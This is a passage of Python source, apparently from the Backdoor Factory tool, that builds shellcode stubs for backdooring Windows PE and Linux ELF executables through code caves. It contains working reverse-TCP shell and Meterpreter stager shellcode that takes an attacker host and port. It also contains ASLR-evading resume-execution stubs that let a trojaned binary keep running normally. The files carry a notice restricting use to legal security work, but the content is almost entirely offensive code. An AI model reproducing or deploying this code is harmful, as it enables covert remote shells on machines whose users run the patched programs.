            elif instr_length == 2:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<H", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 1:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<B", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 0:
                resumeExe += self.opcode_return(OpCode, instr_length)
                ReturnTrackingAddress = item[3]

        resumeExe += "\x49\x81\xe7"
        resumeExe += self.compliment_you  # zero out r15
        resumeExe += "\x49\x81\xe7"
        resumeExe += self.compliment_me  # zero out r15
        resumeExe += "\x49\x81\xc7"  # ADD r15 <<-fix it this a 4 or 8 byte add does it matter?
        if ReturnTrackingAddress >= 4294967295:
            resumeExe += struct.pack('<Q', ReturnTrackingAddress)
        else:
            resumeExe += struct.pack('<I', ReturnTrackingAddress)
        resumeExe += "\x41\x57"  # push r15
        resumeExe += "\x49\x81\xe7"  # zero out r15
        resumeExe += self.compliment_you
        resumeExe += "\x49\x81\xe7"  # zero out r15
        resumeExe += self.compliment_me
        resumeExe += "\xC3"
        return ReturnTrackingAddress, resumeExe


    def resume_execution_32(self):
        """
        This section of code imports the self.flItms['ImpList'] from pe32_entry_instr
        to patch the executable after shellcode execution
        """
        verbose = False
        print "[*] Creating win32 resume execution stub"
        resumeExe = ''
        for item in self.flItms['ImpList']:
            OpCode_address = item[0]
            OpCode = item[1].keys()[0]
            instruction = item[1].values()[0]
            ImpValue = item[2]
            instr_length = item[4]
            if verbose is True:
                if instruction:
                    print 'instruction', hex(instruction)
                else:
                    print "single opcode, no instruction"

            self.ones_compliment()

            if OpCode == int('e8', 16):  # Call instruction
                # Let's beat ASLR :D
                resumeExe += "\xb8"
                if self.flItms['LastCaveAddress'] == 0:
                    self.flItms['LastCaveAddress'] = self.flItms['JMPtoCodeAddress']
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     #The last cave starting point
                                     #self.flItms['JMPtoCodeAddress'] +
                                     self.flItms['LastCaveAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     500 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x12"  # JA (14)
                resumeExe += "\x83\xC1\x15"  # ADD ECX, 15
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..
                call_addr = (self.flItms['VrtStrtngPnt'] +
                             instruction)

                if call_addr > 4294967295:
                    resumeExe += struct.pack('<I', call_addr - 0xffffffff - 1)
                else:
                    resumeExe += struct.pack('<I', call_addr)
                resumeExe += "\xff\xe0"  # JMP EAX
                resumeExe += "\xb8"  # ADD
                resumeExe += struct.pack('<I', item[3])
                resumeExe += "\x50\xc3"  # PUSH EAX,RETN
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                #had to add - 5 to this below
                resumeExe += struct.pack("<I", self.flItms['VrtStrtngPnt'] - 5)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                resumeExe += struct.pack('<I', item[3])
                resumeExe += "\x50"
                resumeExe += "\x05"
                resumeExe += struct.pack('<I', instruction)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif OpCode in self.jump_codes:
                #Let's beat ASLR
                resumeExe += "\xb8"
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     #self.flItms['JMPtoCodeAddress'] +
                                     self.flItms['LastCaveAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     200 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x0b"  # JA (14)
                resumeExe += "\x83\xC1\x16"
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..

                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX,CallV
                resumeExe += "\x50\xc3"
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack('<I', self.flItms['VrtStrtngPnt'] - 5)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue - 2)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif instr_length == 7:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 6:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 5:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 4:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<I", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 3:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 2:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<H", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 1:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<B", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 0:
                resumeExe += self.opcode_return(OpCode, instr_length)
                ReturnTrackingAddress = item[3]

        resumeExe += "\x25"
        resumeExe += self.compliment_you  # zero out EAX
        resumeExe += "\x25"
        resumeExe += self.compliment_me  # zero out EAX
        resumeExe += "\x05"  # ADD
        resumeExe += struct.pack('=i', ReturnTrackingAddress)
        resumeExe += "\x50"  # push eax
        resumeExe += "\x25"  # zero out EAX
        resumeExe += self.compliment_you
        resumeExe += "\x25"  # zero out EAX
        resumeExe += self.compliment_me
        resumeExe += "\xC3"
        return ReturnTrackingAddress, resumeExe

    
########NEW FILE########
__FILENAME__ = intelmodules
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

def eat_code_caves(flItms, caveone, cavetwo):
    try:
        if flItms['CavesPicked'][cavetwo][0] == flItms['CavesPicked'][caveone][0]:
            return int(flItms['CavesPicked'][cavetwo][1], 16) - int(flItms['CavesPicked'][caveone][1], 16)
        else:
            caveone_found = False
            cavetwo_found = False
            forward = True
            windows_memoffset_holder = 0
            for section in flItms['Sections']:
                if flItms['CavesPicked'][caveone][0] == section[0] and caveone_found is False:
                    caveone_found = True
                    if cavetwo_found is False:
                        windows_memoffset_holder += section[1] + 4096 - section[1] % 4096 - section[3]
                        forward = True
                        continue
                    if section[1] % 4096 == 0:
                        continue
                    break

                if flItms['CavesPicked'][cavetwo][0] == section[0] and cavetwo_found is False:
                    cavetwo_found = True
                    if caveone_found is False:
                        windows_memoffset_holder += -(section[1] + 4096 - section[1] % 4096 - section[3])
                        forward = False
                        continue
                    if section[1] % 4096 == 0:
                        continue
                    break

                if caveone_found is True or cavetwo_found is True:
                    if section[1] % 4096 == 0:
                            continue
                    if forward is True:
                        windows_memoffset_holder += section[1] + 4096 - section[1] % 4096 - section[3]
                    if forward is False:
                        windows_memoffset_holder += -(section[1] + 4096 - section[1] % 4096 - section[3])
                    continue

                #Need a way to catch all the sections in between other sections

            return int(flItms['CavesPicked'][cavetwo][1], 16) - int(flItms['CavesPicked'][caveone][1], 16) + windows_memoffset_holder

    except Exception as e:
        #print "EAT CODE CAVE", str(e)
        return 0
########NEW FILE########
__FILENAME__ = LinuxIntelELF32
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import struct
import sys

class linux_elfI32_shellcode():
    """
    Linux ELFIntel x32 shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.stackpreserve = "\x90\x90\x60\x9c"
        self.stackrestore = "\x9d\x61"


    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, CavesPicked={}):
        """
        Modified metasploit linux/x64/shell_reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
       
       
        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
        "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68")
        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\x68\x02\x00"
        #PORT
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += ("\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
        "\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
        "\x52\x53\x89\xe1\xb0\x0b\xcd\x80")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
        "\x97\x5b\x68")
        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\x68\x02\x00"
        #PORT
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += ("\x89\xe1\x6a"
                "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
                "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
                "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, CavesPicked={}):
        """
        For user with position independent shellcode from the user
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()


        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)

########NEW FILE########
__FILENAME__ = LinuxIntelELF64
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import struct
import sys

class linux_elfI64_shellcode():
    """
    ELF Intel x64 shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""

        

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit linux/x64/shell_reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 +=struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
                        "\x48\x97\x48\xb9\x02\x00")
                        #\x22\xb8"
                        #"\x7f\x00\x00\x01
        self.shellcode1 += struct.pack("!H", self.PORT)
                        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x51\x48\x89"
                        "\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
                        "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62"
                        "\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
                        "\x0f\x05")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 +=struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
                            "\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
                            "\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00")
        self.shellcode1 += struct.pack("!H", self.PORT)
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
                            "\x05\x59\x5e\x5a\x0f\x05\xff\xe6")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 += struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)



########NEW FILE########
__FILENAME__ = WinIntelPE32
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''


##########################################################
#               BEGIN win32 shellcodes                   #
##########################################################
import sys
import struct
from intelmodules import eat_code_caves

class winI32_shellcode():
    """
    Windows Intel x32 shellcode class
    """

    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.shellcode = ""
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.stackpreserve = "\x90\x90\x60\x9c"
        self.stackrestore = "\x9d\x61"

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        Reverse tcp stager. Can be used with windows/shell/reverse_tcp or
        windows/meterpreter/reverse_tcp payloads from metasploit.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        flItms['stager'] = True

        breakupvar = eat_code_caves(flItms, 0, 1)

        #shellcode1 is the thread
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE\x22\x01\x00\x00"  # <---Size of shellcode2 in hex
                           "\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                           "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                           "\x89\xF1"
                           )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"  # <--length of shellcode below
        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xE9\x27\x01\x00\x00"

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"
        #Can inject any shellcode below.

        self.shellcode2 += ("\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52"
                            "\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC"
                            "\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57\x8B"
                            "\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01\xD0"
                            "\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B\x01"
                            "\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03"
                            "\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C"
                            "\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B"
                            "\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D\x68"
                            "\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF"
                            "\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF"
                            "\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5"
                            "\x97\x6A\x05\x68"
                            )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += ("\x89\xE6\x6A"
                            "\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E"
                            "\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57"
                            "\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00"
                            "\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53"
                            "\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        This module allows for the user to provide a win32 raw/binary
        shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
        """

        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        breakupvar = eat_code_caves(flItms, 0, 1)
        
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
